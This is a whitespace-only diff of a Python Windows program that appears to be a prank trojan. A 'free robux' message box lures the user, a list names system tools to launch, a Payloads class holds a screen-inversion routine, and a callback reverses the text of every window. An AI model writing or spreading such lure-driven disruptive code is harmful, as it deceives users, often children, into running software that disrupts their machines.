@@ -19,14 +19,14 @@ def Exit():
     exit()
 
 def Warning():
-	if MessageBox("Do you want free robux???? :3", 
-		"Free Robux!", # The title of the warning.
-		MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
-		Exit()
-	if MessageBox("Are you suuree?????", 
-		"Free Robux Forever!", # The title of the warning.
-		MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
-		Exit()
+    if MessageBox("Do you want free robux???? :3", 
+        "Free Robux!", # The title of the warning.
+        MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
+        Exit()
+    if MessageBox("Are you suuree?????", 
+        "Free Robux Forever!", # The title of the warning.
+        MB_YESNO | MB_ICONWARNING) == 7: # If the user pressed no to our warning, exit the program.
+        Exit()
   
 def Music():
     global stage
@@ -58,20 +58,20 @@ def Music():
     # )
   
 class Data:
-	sites = (
-		"http://google.co.ck/search?q=how+to+get+money",
-		"calc",
-		"notepad",
-		"write",
-		"explorer",
-		"taskmgr",
-		"msconfig",
-		"mspaint",
-		"devmgmt.msc",
-		"control"
-		)
-	IconWarning = LoadIcon(None, 32515)
-	IconError = LoadIcon(None, 32513)
+    sites = (
+        "http://google.co.ck/search?q=how+to+get+money",
+        "calc",
+        "notepad",
+        "write",
+        "explorer",
+        "taskmgr",
+        "msconfig",
+        "mspaint",
+        "devmgmt.msc",
+        "control"
+        )
+    IconWarning = LoadIcon(None, 32515)
+    IconError = LoadIcon(None, 32513)
 
 class Payloads:
     def Invert(xstart, ystart, w, h):
@@ -230,16 +230,16 @@ class Payloads:
     
 def EnumChildProc(hwnd, lParam): 
     # callback function for reversing text
-	try:
-		buffering = PyMakeBuffer(255) # create buffering
-		length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) # get length
-		result = str(buffering[0:length*2].tobytes().decode('utf-16'))
-		# reverse text
-		result = result[::-1]
+    try:
+        buffering = PyMakeBuffer(255) # create buffering
+        length = SendMessage(hwnd, WM_GETTEXT, 255, buffering) # get length
+        result = str(buffering[0:length*2].tobytes().decode('utf-16'))
+        # reverse text
+        result = result[::-1]
 
-		SendMessage(hwnd, WM_SETTEXT, None, result) # set the windows text
+        SendMessage(hwnd, WM_SETTEXT, None, result) # set the windows text
 
-	except: pass
+    except: pass
 
 def main():
     
